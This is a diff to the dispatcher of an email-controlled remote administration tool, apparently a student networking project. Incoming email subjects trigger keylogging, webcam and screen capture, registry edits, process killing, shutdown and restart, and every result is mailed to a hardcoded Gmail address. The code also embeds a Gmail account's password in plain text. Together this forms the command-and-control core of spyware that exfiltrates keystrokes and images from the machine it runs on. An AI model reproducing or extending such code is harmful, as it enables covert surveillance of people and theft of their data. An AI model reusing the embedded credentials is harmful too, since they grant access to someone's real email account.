@@ -2,7 +2,7 @@ from re import sub
 import ReceiveEmail
 import SendEmail
 import ListProcesses
-import keylogger
+import KeyLogger
 from time import time, sleep
 import WebcamCapture
 import Registry
@@ -11,11 +11,12 @@ import Restart
 import Shutdown
 import ScreenCapture
 import KillProcess
+import Help
 
 client_address = "client1.computernetwork@gmail.com"
 
 
-client_pass="computernetwork" #unsecure
+client_pass="w l s v j i q z b a y i w k u y" #unsecure
 
 
 # guess_address = "lmtri.fit.hcmus@gmail.com"
@@ -23,18 +24,18 @@ guess_address = "letrong2307@gmail.com"
 thread = None
 def Handling(subject):
     global thread
-    if subject == 'List Processes':
+    if subject == 'LIST PROCESSES':
         content = ListProcesses.ListProcesses()
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
-    elif subject == "Webcam Capture":
-        content = WebcamCapture.CapturePath
+    elif subject == "WEBCAM CAPTURE":
+        content = WebcamCapture.WebcamCapture()
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'image')
-    elif subject == "Start Key Logging":
-        thread = keylogger.StartLogging()
-        content = "Key logging has been launched"
+    elif subject == "START KEY LOGGING":
+        thread = KeyLogger.StartLogging()
+        content = "KEY LOGGING HAS BEEN LAUNCHED"
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
-    elif subject == "End Key Logging":
-        content =   keylogger.EndLogging(thread)
+    elif subject == "END KEY LOGGING":
+        content =   KeyLogger.EndLogging(thread)
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
     elif subject[0] == "COPY FILE":
         content = subject[1]
@@ -45,17 +46,20 @@ def Handling(subject):
     elif subject[0] =="REGISTRY":
         content =  Registry.Registry(subject[1], subject[2], subject[3], subject[4], subject[5])
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
-    elif subject == "Screen Capture":
+    elif subject == "SCREEN CAPTURE":
         content = ScreenCapture.ScreenCapture()
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'image')
-    elif subject == 'Shutdown':
+    elif subject == 'SHUTDOWN':
         content = Shutdown.Shutdown()
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
-    elif subject == 'Restart':
+    elif subject == 'RESTART':
         content = Restart.Restart()
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
-    elif subject[:12] == 'Kill Process':
-        content = KillProcess.KillProcess(subject[13:])
+    elif subject[:12] == 'KILL PROCESS':
+        content = KillProcess.KillProcess(subject[15:])
+        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
+    elif subject == 'HELP':
+        content = Help.Help()
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
     else:
         print("Can't run!")
